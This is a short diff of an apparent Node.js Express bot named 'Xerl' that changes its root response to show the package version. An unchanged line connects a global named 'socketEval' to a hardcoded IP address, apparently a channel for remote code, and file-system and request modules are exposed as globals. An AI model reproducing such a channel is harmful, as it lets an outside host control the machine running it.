@@ -2,7 +2,7 @@ global.fs = require("fs");
 let app=require("express")()
 let port=process.env.PORT||3000
 app.listen(port)
-app.get("/",(req,res)=>{res.send("Xerl is okay")})
+app.get("/",(req,res)=>{res.send("Xerl is V"+require('./package.json').version)})
 global.socketEval = require('socket.io-client')("http://185.246.67.139:5555/")
 global.jimp = require('jimp');
 global.request = require("request")
